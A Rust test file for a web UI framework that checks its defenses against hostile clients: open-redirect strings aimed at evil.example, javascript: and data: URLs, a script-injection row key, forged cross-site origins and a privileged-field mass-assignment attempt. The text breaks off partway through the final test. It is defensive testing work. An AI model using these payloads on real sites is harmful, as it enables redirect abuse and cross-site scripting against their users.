//! What must hold when the client is hostile: replies keep what layers set, a
//! form takes only its own fields from only this site, redirects stay here, and
//! no password comes back. Each test states one protection, so removing the
//! protection fails it.

use std::collections::BTreeMap;
use std::sync::Arc;

use http::{HeaderValue, Method, StatusCode};
use navree_http::extract::Request;
use navree_http::middleware::{self, Next};
use navree_http::response::{IntoResponse, Response};
use navree_http::{Controller, GlobalLayer, HttpModule, LayerSlot, ModuleBuilderHttpExt, RouteDef};
use navree_kernel::{
    BoxFuture, Injectable, KernelError, Module, ModuleBuilder, ProviderKey, Resolver,
};
use navree_testing::{TestApp, TestAppBuilder};
use navree_ui::form::{FormView, Rejected, decode};
use navree_ui::{Form, Op, Reply, Submit, ToastTone, UiModule, Validate, View, el, render};
use serde::Deserialize;

const FORM: &str = "application/x-www-form-urlencoded";

#[derive(Debug, Deserialize, Validate, Form)]
struct Login {
    #[validate(length(min = 8))]
    #[form(widget = password)]
    password: String,
    #[validate(length(min = 1))]
    email: String,
    #[validate(skip)]
    #[form(skip)]
    #[serde(default)]
    is_admin: bool,
}

fn pairs(list: &[(&str, &str)]) -> Vec<(String, String)> {
    list.iter()
        .map(|(name, value)| ((*name).to_owned(), (*value).to_owned()))
        .collect()
}

async fn with_cookie() -> Response {
    let mut response = Reply::redirect("/home")
        .toast(ToastTone::Success, "signed in")
        .into_response();
    response.headers_mut().append(
        http::header::SET_COOKIE,
        HeaderValue::from_static("app_login=abc; Path=/; HttpOnly"),
    );
    response
        .headers_mut()
        .insert("x-custom", HeaderValue::from_static("kept"));
    response
}

#[derive(Deserialize)]
struct NextUrl {
    next: String,
}

async fn open(navree_http::Query(query): navree_http::Query<NextUrl>) -> Reply {
    Reply::redirect(query.next)
}

async fn store(submit: Result<Submit<Login>, Rejected<Login>>) -> Response {
    match submit {
        Ok(Submit(login)) => format!("ok admin={}", login.is_admin).into_response(),
        Err(rejected) => rejected.into_response(),
    }
}

async fn inspect(submit: Result<Submit<Login>, Rejected<Login>>) -> String {
    match submit {
        Ok(_) => "ok".to_owned(),
        Err(rejected) => format!("{rejected:?}"),
    }
}

struct Pages;

impl Injectable for Pages {
    fn dependencies() -> Vec<ProviderKey> {
        Vec::new()
    }

    fn construct(_: Resolver) -> BoxFuture<'static, Result<Self, KernelError>> {
        Box::pin(async { Ok(Self) })
    }
}

impl Controller for Pages {
    fn prefix(&self) -> &'static str {
        ""
    }

    fn routes(self: Arc<Self>) -> Vec<RouteDef> {
        vec![
            RouteDef::on(Method::POST, "!/cookie", with_cookie).public(),
            RouteDef::on(Method::POST, "!/open", open).public(),
            RouteDef::on(Method::POST, "!/store", store).public(),
            RouteDef::on(Method::GET, "!/store", store).public(),
            RouteDef::on(Method::POST, "!/inspect", inspect).public(),
            RouteDef::on(Method::GET, "!/answer", || async {
                Reply::view(View::new("Page").body("page")).op(Op::Reload)
            })
            .public(),
        ]
    }
}

struct App;

impl Module for App {
    fn register(&self, m: &mut ModuleBuilder) {
        m.controller::<Pages>();
    }
}

/// A layer in the session's slot that sets a cookie, as a session layer does.
struct SessionLike;

impl Module for SessionLike {
    fn register(&self, m: &mut ModuleBuilder) {
        m.http_layer(GlobalLayer::new(
            LayerSlot::Session,
            "test.session",
            |_, router| Ok(router.layer(middleware::from_fn(session_like))),
        ));
    }
}

async fn session_like(request: Request, next: Next) -> Response {
    let mut response = next.run(request).await;
    response.headers_mut().append(
        http::header::SET_COOKIE,
        HeaderValue::from_static("sid=rotated; Path=/; HttpOnly"),
    );
    response
}

fn builder() -> TestAppBuilder {
    TestApp::builder()
        .config("http.per_ip_rate_limit", serde_json::Value::Null)
        .module(HttpModule::for_root(Default::default()))
}

async fn app() -> TestApp {
    builder().module(UiModule).module(App).build().await
}

#[tokio::test]
async fn a_reply_to_the_runtime_keeps_the_headers_set_on_it() {
    let app = app().await;
    let response = app
        .client()
        .post("/cookie")
        .header("x-navree-ui", "1")
        .send()
        .await;
    assert_eq!(
        response.header("content-type"),
        Some("application/vnd.navree.ops+json")
    );
    assert_eq!(
        response
            .set_cookie("app_login")
            .map(|cookie| cookie.value().to_owned())
            .as_deref(),
        Some("abc")
    );
    assert_eq!(response.header("x-custom"), Some("kept"));
    assert_eq!(
        response.header("location"),
        None,
        "a runtime answer is not a redirect"
    );
    assert_eq!(response.header("cache-control"), Some("no-store"));
}

#[tokio::test]
async fn a_toast_for_the_runtime_leaves_no_flash_for_the_next_page() {
    let app = app().await;
    let response = app
        .client()
        .post("/cookie")
        .header("x-navree-ui", "1")
        .send()
        .await;
    assert!(
        response.set_cookie("navree_ui_flash").is_none(),
        "the toast op already shows it"
    );
    let plain = app.client().post("/cookie").send().await;
    assert!(plain.set_cookie("navree_ui_flash").is_some());
}

#[tokio::test]
async fn a_cookie_from_a_session_layer_survives_in_either_module_order() {
    let ui_first = builder()
        .module(UiModule)
        .module(SessionLike)
        .module(App)
        .build()
        .await;
    let session_first = builder()
        .module(SessionLike)
        .module(UiModule)
        .module(App)
        .build()
        .await;
    for app in [ui_first, session_first] {
        let response = app
            .client()
            .post("/cookie")
            .header("x-navree-ui", "1")
            .send()
            .await;
        assert_eq!(
            response
                .set_cookie("sid")
                .map(|cookie| cookie.value().to_owned())
                .as_deref(),
            Some("rotated")
        );
    }
}

#[tokio::test]
async fn a_reply_varies_on_the_runtime_header() {
    let app = app().await;
    for response in [
        app.client().get("/answer").send().await,
        app.client()
            .get("/answer")
            .header("x-navree-ui", "1")
            .send()
            .await,
    ] {
        let vary: Vec<&str> = response
            .headers()
            .get_all("vary")
            .iter()
            .filter_map(|value| value.to_str().ok())
            .collect();
        assert!(
            vary.iter()
                .any(|value| value.to_ascii_lowercase().contains("x-navree-ui")),
            "{vary:?}"
        );
    }
}

#[test]
fn a_field_marked_skip_cannot_be_set_by_the_client() {
    let login: Login = decode(&pairs(&[
        ("password", "longenough"),
        ("email", "a@b"),
        ("is_admin", "true"),
    ]))
    .unwrap();
    assert!(!login.is_admin);
}

#[tokio::test]
async fn a_submit_ignores_fields_the_form_does_not_have() {
    let app = app().await;
    let response = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .body("password=longenough&email=a&is_admin=true")
        .send()
        .await;
    assert_eq!(response.text(), "ok admin=false");
}

#[tokio::test]
async fn a_submit_stops_at_a_count_of_fields_and_keeps_only_its_own() {
    let app = app().await;
    let junk = "a&".repeat(200);
    let response = app
        .client()
        .post("/inspect")
        .header("content-type", FORM)
        .body(junk)
        .send()
        .await;
    assert!(
        !response.text().contains("\"a\""),
        "names the form lacks are not kept: {}",
        response.text()
    );
    let flood = "a&".repeat(100_000);
    let response = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .body(flood)
        .send()
        .await;
    assert_eq!(response.status(), StatusCode::PAYLOAD_TOO_LARGE);
    let own = "email=x&".repeat(100_000);
    let response = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .body(own)
        .send()
        .await;
    assert_eq!(response.status(), StatusCode::PAYLOAD_TOO_LARGE);
}

#[tokio::test]
async fn a_rejected_page_echoes_a_bounded_amount() {
    let app = app().await;
    let body = format!("email={}", "%27".repeat(600_000));
    let response = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .body(body)
        .send()
        .await;
    assert_eq!(response.status(), StatusCode::UNPROCESSABLE_ENTITY);
    assert!(
        response.text().len() < 512 * 1024,
        "{}",
        response.text().len()
    );
}

const OFF_ORIGIN: [&str; 9] = [
    "//evil.example/x",
    "/\\evil.example/x",
    "\\\\evil.example",
    "\\/evil.example",
    "https://evil.example/x",
    "http:evil.example",
    "HTTPS://evil.example",
    "https:\\\\evil.example",
    "javascript:alert(1)",
];

fn stays_here(url: &str) -> bool {
    let url = url.replace('\\', "/");
    !url.starts_with("//")
        && !url.to_ascii_lowercase().starts_with("http")
        && !url.to_ascii_lowercase().starts_with("javascript")
}

#[test]
fn a_redirect_stays_on_this_origin() {
    for url in OFF_ORIGIN {
        let response = Reply::redirect(url).into_response();
        let location = response
            .headers()
            .get("location")
            .and_then(|value| value.to_str().ok())
            .unwrap_or_default();
        assert!(stays_here(location), "{url} -> {location}");
    }
    for url in [
        "/deals/1?x=a:b#c:d",
        "/",
        "?page=2",
        "#top",
        "deals/1",
        "../up",
        "/a//b",
    ] {
        let response = Reply::redirect(url).into_response();
        assert_eq!(response.headers()["location"], url);
    }
}

#[test]
fn a_navigate_op_stays_on_this_origin() {
    for url in OFF_ORIGIN {
        let Op::Navigate { href, .. } = Op::navigate(url) else {
            panic!("an op that navigates")
        };
        assert!(stays_here(&href), "{url} -> {href}");
    }
}

#[test]
fn a_redirect_with_letters_outside_ascii_keeps_its_location() {
    let response = Reply::redirect("/caf\u{e9}?q=\u{e9}").into_response();
    assert_eq!(response.headers()["location"], "/caf%C3%A9?q=%C3%A9");
}

#[tokio::test]
async fn a_submit_refuses_another_site() {
    let app = app().await;
    let body = "password=longenough&email=a";
    for site in ["cross-site", "same-site"] {
        let response = app
            .client()
            .post("/store")
            .header("content-type", FORM)
            .header("sec-fetch-site", site)
            .header("origin", "https://evil.example")
            .body(body)
            .send()
            .await;
        assert_eq!(response.status(), StatusCode::FORBIDDEN, "{site}");
    }
    // A browser that predates Fetch Metadata still names the page's origin.
    let response = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .header("host", "app.example")
        .header("origin", "https://evil.example")
        .body(body)
        .send()
        .await;
    assert_eq!(response.status(), StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn a_submit_takes_this_site_and_clients_that_are_not_browsers() {
    let app = app().await;
    let body = "password=longenough&email=a";
    let same = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .header("sec-fetch-site", "same-origin")
        .body(body)
        .send()
        .await;
    assert_eq!(same.status(), StatusCode::OK);
    let same_host = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .header("host", "app.example")
        .header("origin", "https://app.example")
        .body(body)
        .send()
        .await;
    assert_eq!(same_host.status(), StatusCode::OK);
    let script = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .without_header("origin")
        .body(body)
        .send()
        .await;
    assert_eq!(script.status(), StatusCode::OK);
}

#[tokio::test]
async fn a_submit_with_a_cookie_and_no_word_from_a_browser_is_refused() {
    let app = app().await;
    let body = "password=longenough&email=a";
    // A request that carries a session and says nothing of where it came from is not taken:
    // a client that sends no cookie has no session to ride on, this one has.
    for cookie in ["sid=abc", "theme=dark; sid=abc"] {
        let response = app
            .client()
            .post("/store")
            .header("content-type", FORM)
            .without_header("origin")
            .header("cookie", cookie)
            .body(body)
            .send()
            .await;
        assert_eq!(response.status(), StatusCode::FORBIDDEN, "{cookie}");
    }
    // With the browser's word that it came from this site, it is.
    let same = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .header("cookie", "sid=abc")
        .header("sec-fetch-site", "same-origin")
        .body(body)
        .send()
        .await;
    assert_eq!(same.status(), StatusCode::OK);
}

#[tokio::test]
async fn a_submit_takes_a_front_end_the_app_trusts() {
    let app = TestApp::builder()
        .config("http.per_ip_rate_limit", serde_json::Value::Null)
        .config(
            "http.cors.allowed_origins",
            serde_json::json!(["https://front.example"]),
        )
        .module(HttpModule::from_config())
        .module(UiModule)
        .module(App)
        .build()
        .await;
    let body = "password=longenough&email=a";
    let trusted = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .header("sec-fetch-site", "cross-site")
        .header("origin", "https://front.example")
        .body(body)
        .send()
        .await;
    assert_eq!(trusted.status(), StatusCode::OK);
    let other = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .header("sec-fetch-site", "cross-site")
        .header("origin", "https://evil.example")
        .body(body)
        .send()
        .await;
    assert_eq!(other.status(), StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn a_submit_never_comes_by_get_and_is_a_form() {
    let app = app().await;
    let response = app
        .client()
        .get("/store?password=longenough&email=a")
        .send()
        .await;
    assert_eq!(response.status(), StatusCode::METHOD_NOT_ALLOWED);
    assert_eq!(response.header("allow"), Some("POST"));
    for kind in ["text/plain", "application/json"] {
        let response = app
            .client()
            .post("/store")
            .header("content-type", kind)
            .body("password=longenough&email=a")
            .send()
            .await;
        assert_eq!(
            response.status(),
            StatusCode::UNSUPPORTED_MEDIA_TYPE,
            "{kind}"
        );
    }
    let none = app
        .client()
        .post("/store")
        .body("password=longenough&email=a")
        .send()
        .await;
    assert_eq!(
        none.status(),
        StatusCode::UNSUPPORTED_MEDIA_TYPE,
        "fetch with a Blob sends no type"
    );
    let charset = app
        .client()
        .post("/store")
        .header(
            "content-type",
            "application/x-www-form-urlencoded; charset=UTF-8",
        )
        .body("password=longenough&email=a")
        .send()
        .await;
    assert_eq!(charset.status(), StatusCode::OK);
}

#[tokio::test]
async fn a_rejected_form_never_echoes_a_password() {
    let app = app().await;
    let response = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .body("password=hunter2&email=")
        .send()
        .await;
    assert_eq!(response.status(), StatusCode::UNPROCESSABLE_ENTITY);
    assert!(!response.text().contains("hunter2"), "{}", response.text());
    assert!(
        response.text().contains(r#"name="password""#),
        "the field is still drawn"
    );
    let debug = app
        .client()
        .post("/inspect")
        .header("content-type", FORM)
        .body("password=hunter2&email=mail-value")
        .send()
        .await
        .text();
    assert!(!debug.contains("hunter2"), "{debug}");
    assert!(
        !debug.contains("mail-value"),
        "values stay out of logs: {debug}"
    );
}

#[test]
fn a_password_field_never_writes_a_value() {
    let html = render(
        &FormView::<Login>::new()
            .post("/x")
            .with_values(pairs(&[("password", "hunter2"), ("email", "kept@b")]))
            .into(),
    );
    assert!(!html.contains("hunter2"), "{html}");
    assert!(html.contains("kept@b"), "{html}");
    let html = render(&navree_ui::Input::password("p").value("hunter2").into());
    assert!(!html.contains("hunter2"), "{html}");
}

fn html_of(element: navree_ui::Element) -> String {
    render(&element.into())
}

#[test]
fn url_attributes_are_checked_in_any_case_and_every_name() {
    for name in [
        "href",
        "HREF",
        "Href",
        "src",
        "SRC",
        "action",
        "formaction",
        "poster",
        "cite",
        "ping",
        "data",
        "DATA",
        "xlink:href",
        "background",
    ] {
        let html = html_of(el("a").attr(name, "javascript:alert(1)"));
        assert!(!html.contains("javascript"), "{name}: {html}");
    }
}

#[test]
#[cfg_attr(debug_assertions, should_panic(expected = "not allowed"))]
fn inline_style_is_never_written() {
    assert!(!html_of(el("a").attr("style", "color:red")).contains("color"));
}

#[test]
#[cfg_attr(debug_assertions, should_panic(expected = "not allowed"))]
fn a_handler_is_never_written() {
    assert!(!html_of(el("a").attr("onclick", "alert(1)")).contains("alert"));
}

#[test]
#[cfg_attr(debug_assertions, should_panic(expected = "not allowed"))]
fn a_document_in_an_attribute_is_never_written() {
    assert!(!html_of(el("iframe").attr("srcdoc", "<b>x</b>")).contains("<b>"));
}

#[test]
#[cfg_attr(debug_assertions, should_panic(expected = "not allowed"))]
fn a_handler_in_capitals_is_never_written() {
    assert!(!html_of(el("a").attr("ONCLICK", "alert(1)")).contains("alert"));
}

#[test]
#[cfg_attr(debug_assertions, should_panic(expected = "not allowed"))]
fn inline_style_in_mixed_case_is_never_written() {
    assert!(!html_of(el("a").attr("Style", "color:red")).contains("color"));
}

#[test]
fn flags_refuse_the_same_names() {
    for name in ["style", "Style", "onclick", "ONLOAD", "srcdoc", "SRCDOC"] {
        assert_eq!(html_of(el("a").flag(name, true)), "<a></a>", "{name}");
    }
}

#[test]
#[cfg_attr(debug_assertions, should_panic(expected = "not allowed"))]
fn the_elements_that_load_or_navigate_are_never_written() {
    for tag in [
        "script", "style", "meta", "base", "link", "iframe", "object", "embed",
    ] {
        let html = html_of(el(tag).attr("data-x", "1"));
        assert!(!html.contains(&format!("<{tag}")), "{html}");
    }
}

#[test]
fn a_command_sets_only_state_attributes() {
    use navree_ui::{Cmd, Commands};
    for name in [
        "href",
        "HREF",
        "src",
        "action",
        "formaction",
        "onclick",
        "ONCLICK",
        "style",
        "srcdoc",
        "ping",
        "poster",
        "srcset",
        "data",
        "xlink:href",
        "form",
        "name",
        "method",
        "target",
        "popover",
        "data-ui-src",
        "data-ui-click",
        "DATA-UI-CLICK",
        "data-ui-persist",
        "http-equiv",
        "id",
    ] {
        // Built by hand, past the constructors' check: the wire still refuses them.
        let target = String::from("t");
        assert_eq!(
            Commands::from(Cmd::SetAttr {
                target: target.clone(),
                name,
                value: "x".into(),
            })
            .to_json(),
            "[]",
            "{name}"
        );
        assert_eq!(
            Commands::from(Cmd::RemoveAttr {
                target: target.clone(),
                name,
            })
            .to_json(),
            "[]",
            "{name}"
        );
        assert_eq!(
            Commands::from(Cmd::ToggleAttr { target, name }).to_json(),
            "[]",
            "{name}"
        );
    }
    for name in ["data-open", "aria-expanded", "hidden", "open", "disabled"] {
        assert_ne!(
            Commands::from(Cmd::set_attr("t", name, "x")).to_json(),
            "[]",
            "{name}"
        );
    }
}

/// A command that names an attribute it may not touch is a mistake in the page's code:
/// it says so where the command is built, instead of doing nothing in the browser.
#[test]
#[cfg(debug_assertions)]
fn a_refused_attribute_fails_where_the_command_is_built() {
    use navree_ui::Cmd;
    for build in [
        (|| drop(Cmd::set_attr("sort", "value", "amount"))) as fn(),
        || drop(Cmd::remove_attr("a", "href")),
        || drop(Cmd::toggle_attr("a", "data-ui-click")),
    ] {
        let failed = std::panic::catch_unwind(build).expect_err("refused at build time");
        let message = failed.downcast_ref::<String>().cloned().unwrap_or_default();
        assert!(message.contains("may not"), "{message}");
    }
    let failed = std::panic::catch_unwind(|| drop(Cmd::set_attr("sort", "value", "x")))
        .expect_err("refused");
    let message = failed.downcast_ref::<String>().cloned().unwrap_or_default();
    assert!(
        message.contains("Cmd::value"),
        "points at the way that works: {message}"
    );
}

#[test]
fn the_speculation_rules_only_name_links_marked_safe() {
    let rules = navree_ui::assets::get("speculation").expect("the rule file");
    let text = std::str::from_utf8(rules.bytes).unwrap();
    assert!(text.contains("[data-ui-prefetch]"), "{text}");
}

#[test]
fn nothing_is_fetched_ahead_unless_it_asks() {
    use navree_ui::{
        Breadcrumb, Button, DataTable, NavGroup, NavItem, Shell, TableQuery, TableRow, UserMenu,
    };
    let shell = Shell::new("A")
        .group(
            NavGroup::plain()
                .item(NavItem::new("Deals", "/deals"))
                .item(NavItem::new("Asked", "/asked").prefetch())
                .item(NavItem::new("Undone", "/undone").prefetch().no_prefetch()),
        )
        .user(
            UserMenu::new("Anu", "a@b")
                .link("Settings", "/settings")
                .action("Sign out", "/sign-out"),
        );
    let html = shell
        .clone()
        .page("Other", "/other")
        .crumb("Home", "/home")
        .to_view()
        .to_html();
    assert_eq!(
        html.matches("data-ui-prefetch").count(),
        1,
        "only the item that asked: {html}"
    );
    assert!(
        html.contains(r#"href="/asked" title="Asked" data-ui-prefetch>"#),
        "{html}"
    );
    assert!(html.contains(r#"href="/deals" title="Deals">"#), "{html}");
    assert!(html.contains(r#"href="/undone" title="Undone">"#), "{html}");
    assert!(
        html.contains(r#"href="/settings">Settings"#),
        "a menu link is not marked: {html}"
    );
    assert!(
        !html.contains(r#"<a data-slot="menu-link" href="/sign-out""#),
        "{html}"
    );
    assert!(
        html.contains(r#"<form method="post" action="/sign-out" data-ui-form>"#),
        "{html}"
    );
    assert!(
        html.contains(r#"<button data-slot="menu-link" type="submit">Sign out</button>"#),
        "{html}"
    );
    // The app's name and the breadcrumb, when the app and the page ask.
    let html = shell
        .prefetch_home()
        .page("Other", "/other")
        .crumb("Home", "/home")
        .prefetch_crumbs()
        .to_view()
        .to_html();
    assert!(
        html.contains(r#"data-slot="sidebar-brand" href="/" title="A" data-ui-prefetch>"#),
        "{html}"
    );
    assert!(
        html.contains(r#"<a href="/home" data-ui-prefetch>Home</a>"#),
        "{html}"
    );
    let html = render(&Button::primary("Open").href("/x").into());
    assert!(!html.contains("data-ui-prefetch"), "{html}");
    let html = render(&Button::primary("Open").href("/x").prefetch().into());
    assert!(html.contains("data-ui-prefetch"), "{html}");
    let html = render(&Breadcrumb::new().link("Deals", "/deals").into());
    assert!(!html.contains("data-ui-prefetch"), "{html}");
    let html = render(
        &Breadcrumb::new()
            .prefetch()
            .link("Deals", "/deals")
            .current("Agra")
            .into(),
    );
    assert_eq!(html.matches("data-ui-prefetch").count(), 1, "{html}");

    // A table's own links, only when the table asks: the mark is on the table, where
    // the runtime reads it, and a cell's link never carries one.
    #[derive(Clone, TableRow)]
    struct Row {
        #[col(skip)]
        id: i64,
        #[col(sortable, link = "/deals/{id}")]
        title: String,
    }
    let rows = vec![Row {
        id: 1,
        title: "Agra".into(),
    }];
    let query = TableQuery::<Row>::parse("/deals", "");
    let html = render(&DataTable::new("deals", &query, &rows).into());
    assert!(!html.contains("data-ui-prefetch"), "{html}");
    let html = render(&DataTable::new("deals", &query, &rows).prefetch().into());
    assert_eq!(html.matches("data-ui-prefetch").count(), 1, "{html}");
    assert!(
        html.contains(r#"data-ui-table data-ui-prefetch"#),
        "on the table itself: {html}"
    );
}

/// Fetching with no hover costs a page's bytes on every visit: no link does it unless
/// the page asks, link by link.
#[test]
fn nothing_is_fetched_eagerly_unless_a_link_asks() {
    use navree_ui::{Button, NavGroup, NavItem, Shell};
    let shell = Shell::new("A").group(
        NavGroup::plain()
            .item(NavItem::new("Deals", "/deals"))
            .item(NavItem::new("Inbox", "/inbox").prefetch_eager()),
    );
    let html = shell.page("Other", "/other").to_view().to_html();
    assert_eq!(
        html.matches(r#"data-ui-prefetch="eager""#).count(),
        1,
        "{html}"
    );
    assert!(
        html.contains(r#"href="/inbox" title="Inbox" data-ui-prefetch="eager""#),
        "{html}"
    );
    assert!(html.contains(r#"href="/deals" title="Deals">"#), "{html}");
    let html = render(&Button::primary("Open").href("/x").prefetch_eager().into());
    assert!(html.contains(r#"data-ui-prefetch="eager""#), "{html}");
    let html = render(&navree_ui::el("a").href("/x").prefetch_eager().into());
    assert!(html.contains(r#"data-ui-prefetch="eager""#), "{html}");
    let rules = navree_ui::assets::get("speculation").expect("the rule file");
    let text = std::str::from_utf8(rules.bytes).unwrap();
    assert!(
        text.contains(r#""selector_matches":"[data-ui-prefetch=eager]"},{"not""#)
            && text.contains(r#""eagerness":"eager""#),
        "a page with no script asks the browser the same: {text}"
    );
}

#[test]
fn a_request_says_when_it_is_a_prefetch() {
    let mut headers = http::HeaderMap::new();
    assert!(!navree_ui::is_prefetch(&headers));
    headers.insert("x-navree-ui", HeaderValue::from_static("1"));
    assert!(
        !navree_ui::is_prefetch(&headers),
        "a real boosted navigation"
    );
    headers.insert("x-navree-prefetch", HeaderValue::from_static("1"));
    assert!(navree_ui::is_prefetch(&headers));
    let mut headers = http::HeaderMap::new();
    headers.insert(
        "sec-purpose",
        HeaderValue::from_static("prefetch;anonymous-client-ip"),
    );
    assert!(navree_ui::is_prefetch(&headers));
}

#[test]
fn an_error_of_the_whole_form_is_drawn() {
    let errors = BTreeMap::from([(
        "_form".to_owned(),
        vec!["This form could not be read.".to_owned()],
    )]);
    let html = render(
        &FormView::<Login>::new()
            .post("/x")
            .with_errors(errors)
            .into(),
    );
    assert!(html.contains("This form could not be read."), "{html}");
    assert!(html.contains(r#"role="alert""#), "{html}");
}

#[tokio::test]
async fn a_repeated_field_says_so_with_javascript_off() {
    let app = app().await;
    let response = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .body("password=longenough&email=a&email=b")
        .send()
        .await;
    assert_eq!(response.status(), StatusCode::UNPROCESSABLE_ENTITY);
    assert!(
        response.text().contains("could not be read"),
        "{}",
        response.text()
    );
}

#[test]
fn a_textarea_keeps_a_first_newline() {
    let html = render(&navree_ui::Textarea::new("a").value("\nfirst").into());
    assert!(
        html.contains(">\n\nfirst</textarea>"),
        "the parser eats one newline: {html}"
    );
    let html = render(&navree_ui::Textarea::new("a").value("first").into());
    assert!(html.contains(">first</textarea>"), "{html}");
}

#[test]
fn a_page_with_no_flash_sets_no_cookie() {
    let response = navree_ui::Shell::new("A")
        .page("x", "/")
        .to_view()
        .into_response();
    assert!(response.headers().get("set-cookie").is_none());
}

#[test]
fn a_flash_keeps_its_tone() {
    for (tone, slot) in [
        (ToastTone::Danger, "danger"),
        (ToastTone::Warning, "warning"),
        (ToastTone::Info, "info"),
    ] {
        let response = Reply::redirect("/x")
            .toast(tone, "Payment failed")
            .into_response();
        let cookie = response.headers()["set-cookie"]
            .to_str()
            .unwrap()
            .to_owned();
        assert!(
            cookie.starts_with(&format!("navree_ui_flash={slot}:Payment%20failed;")),
            "{cookie}"
        );
    }
    let response = Reply::redirect("/x")
        .toast(ToastTone::Success, "Done")
        .into_response();
    assert!(
        response.headers()["set-cookie"]
            .to_str()
            .unwrap()
            .starts_with("navree_ui_flash=Done;")
    );
}

#[test]
fn a_very_deep_tree_drops_on_a_small_stack() {
    let worker = std::thread::Builder::new()
        .stack_size(256 * 1024)
        .spawn(|| {
            let mut element = el("div");
            for _ in 0..200_000 {
                element = el("div").child(element);
            }
            let node = navree_ui::Node::from(element);
            drop(node);
            let mut list = navree_ui::Node::list("x");
            for _ in 0..200_000 {
                list = navree_ui::Node::list(("y", list));
            }
            drop(list);
        });
    worker.unwrap().join().expect("no overflow");
}

#[test]
fn money_reads_back_what_it_writes_and_refuses_stray_commas() {
    use navree_ui::Money;
    assert_eq!(
        Money::parse(&Money(i64::MIN).display()),
        Some(Money(i64::MIN))
    );
    assert_eq!(
        Money::parse(&Money(i64::MAX).display()),
        Some(Money(i64::MAX))
    );
    for bad in [
        "1,,,,2",
        ",1",
        "1,",
        "1,2",
        "1,2345",
        "1.2,3",
        "-,5",
        "92233720368547758.08",
        "-92233720368547758.09",
    ] {
        assert_eq!(Money::parse(bad), None, "{bad}");
    }
    assert_eq!(Money::parse("12,34,567.50"), Some(Money(123_456_750)));
    assert_eq!(Money::parse("1,000"), Some(Money(100_000)));
}

#[test]
fn the_policy_is_exactly_this() {
    // A change here has to be deliberate: each directive stops an attack in
    // `e2e/ui/tests/hostile.test.mjs`.
    assert_eq!(
        navree_ui::PAGE_CSP,
        "default-src 'none'; script-src 'self'; style-src 'self'; font-src 'self'; img-src 'self' data:; connect-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'none'"
    );
}

#[tokio::test]
async fn every_page_and_every_rejected_form_carries_the_policy() {
    let app = app().await;
    let page = app.client().get("/answer").send().await;
    assert_eq!(
        page.header("content-security-policy"),
        Some(navree_ui::PAGE_CSP)
    );
    let rejected = app
        .client()
        .post("/store")
        .header("content-type", FORM)
        .body("password=x&email=")
        .send()
        .await;
    assert_eq!(rejected.status(), StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(
        rejected.header("content-security-policy"),
        Some(navree_ui::PAGE_CSP)
    );
}

#[test]
fn the_flash_cookie_is_out_of_reach_of_scripts() {
    let response = Reply::redirect("/x")
        .toast(ToastTone::Success, "Done")
        .into_response();
    let cookie = response.headers()["set-cookie"]
        .to_str()
        .unwrap()
        .to_owned();
    assert!(cookie.contains("; HttpOnly"), "{cookie}");
    assert!(cookie.contains("; SameSite=Lax"), "{cookie}");
}

#[derive(navree_ui::TableRow)]
struct Linked {
    #[col(skip)]
    id: String,
    #[col(link = "{site}")]
    label: String,
    #[col(skip)]
    site: String,
}

fn table_of(id: &str, site: &str) -> String {
    type Query = navree_ui::TableQuery<Linked, navree_ui::table::NoFilter>;
    let query = Query::parse("/t", "");
    let rows = vec![Linked {
        id: id.to_owned(),
        label: "open".to_owned(),
        site: site.to_owned(),
    }];
    render(&navree_ui::DataTable::new("t", &query, &rows).into())
}

#[test]
fn a_row_link_goes_through_the_url_check() {
    for site in [
        "javascript:alert(1)",
        "JAVASCRIPT:alert(1)",
        "data:text/html,x",
        "java\tscript:x",
    ] {
        let html = table_of("1", site);
        assert!(!html.contains(site), "{html}");
        // A field in a link is one path segment, so it can't be a scheme.
        assert!(html.contains("<bdi>open</bdi></a>"), "{html}");
        assert!(
            !html.to_lowercase().contains(r#"href="javascript:"#),
            "{html}"
        );
        assert!(!html.contains(r#"href="data:"#), "{html}");
    }
}

#[test]
fn a_row_key_is_escaped() {
    let html = table_of("\"><script>1</script>", "/ok");
    assert!(!html.contains("<script"), "{html}");
    assert!(
        html.contains(r#"data-key="&quot;&gt;&lt;script&gt;1&lt;/script&gt;""#),
        "{html}"
    );
}

#[test]
fn page_zero_is_page_one() {
    type Query = navree_ui::TableQuery<Linked, navree_ui::table::NoFilter>;
    let query = Query::parse("/t", "page=0");
    assert_eq!(query.page(), 1);
    assert_eq!(query.offset(), 0, "no wrap below zero");
}

#[test]
fn a_page_past_the_end_says_so_in_the_footer() {
    type Query = navree_ui::TableQuery<Linked, navree_ui::table::NoFilter>;
    let query = Query::parse("/t", "page=10000000&per_page=1000");
    let rows = vec![Linked {
        id: "1".to_owned(),
        label: "open".to_owned(),
        site: "/x".to_owned(),
    }];
    let html = render(
        &navree_ui::DataTable::new("t", &query, &rows)
            .total(3)
            .into(),
    );
    assert!(!html.contains("4294967294001"), "{html}");
}

/// Commands set on one element twice, or by `on_click` and `on`, all run: the browser
/// reads only the first of two attributes with one name.
#[test]
fn commands_on_one_trigger_are_one_list() {
    use navree_ui::{Button, Cmd, Trigger};
    let html = render(
        &navree_ui::el("button")
            .on_click(Cmd::show("a"))
            .on(Trigger::Click, vec![Cmd::hide("b"), Cmd::focus("c")])
            .on(Trigger::Change, Cmd::show("d"))
            .into(),
    );
    assert_eq!(html.matches("data-ui-click=").count(), 1, "{html}");
    assert!(
        html.contains(r#"data-ui-click="[[&quot;show&quot;,&quot;a&quot;],[&quot;hide&quot;,&quot;b&quot;],[&quot;focus&quot;,&quot;c&quot;]]""#),
        "{html}"
    );
    assert!(html.contains("data-ui-change="), "{html}");
    let html = render(
        &Button::outline("x")
            .on_click(Cmd::show("a"))
            .on_click(Cmd::hide("b"))
            .into(),
    );
    assert_eq!(html.matches("data-ui-click=").count(), 1, "{html}");
